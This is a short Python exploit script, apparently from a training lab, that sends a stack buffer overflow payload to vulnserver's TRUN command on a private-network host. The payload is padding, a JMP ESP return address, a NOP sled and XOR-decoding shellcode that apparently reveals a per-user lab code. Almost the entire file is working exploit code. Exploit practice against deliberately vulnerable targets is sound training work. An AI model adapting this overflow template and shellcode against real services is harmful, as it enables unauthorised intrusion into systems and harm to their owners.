#!/usr/bin/python3

# To use on vulnserver trun to get the code. Code is unique to each user so don't try copying mine

from pwn import *

# === Target info ===
host = "192.168.145.128"
port = 9999
s = remote(host, port)

shellcode = b"\x31\xC0\x50\x68\x27\x78\x79\x22\x68\x79\x23\x77\x70\x68\x76\x79\x70\x73\x68\x79\x23\x79\x70\x68\x25\x73\x71\x73\x68\x71\x76\x73\x72\x68\x71\x79\x24\x20\x68\x24\x79\x70\x24\x68\x70\x20\x22\x71\x68\x25\x74\x70\x77\x68\x79\x78\x75\x79\x68\x23\x76\x27\x75\x68\x76\x25\x78\x27\x68\x23\x22\x78\x73\x68\x75\x70\x22\x22\x68\x70\x77\x25\x73\x68\x22\x79\x27\x70\x68\x20\x71\x79\x75\x68\x73\x72\x78\x77\x68\x27\x76\x27\x70\x68\x76\x22\x70\x71\x68\x23\x20\x20\x77\x68\x72\x76\x73\x23\x68\x27\x77\x79\x25\x68\x71\x78\x23\x71\x68\x76\x25\x27\x22\x68\x27\x76\x24\x75\x68\x78\x24\x75\x72\x68\x77\x73\x79\x25\x68\x25\x73\x73\x24\x68\x77\x27\x78\x75\x68\x79\x23\x24\x25\x54\x5E\x8B\xFE\x8B\xD7\xFC\xB9\x80\x00\x00\x00\xBB\x41\x00\x00\x00\x31\xC0\x50\xAC\x33\xC3\xAA\xE2\xFA\x54\x5E\xCC"


payload = b"".join([
    b"TRUN /.:/",
    b"A" * 2003,
    p32(0x625011af),
    b"\x90" * 16,
    b"\xcc",
    shellcode
])

payload += b"C" * (3000 - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[*] Payload sent!")
s.close()
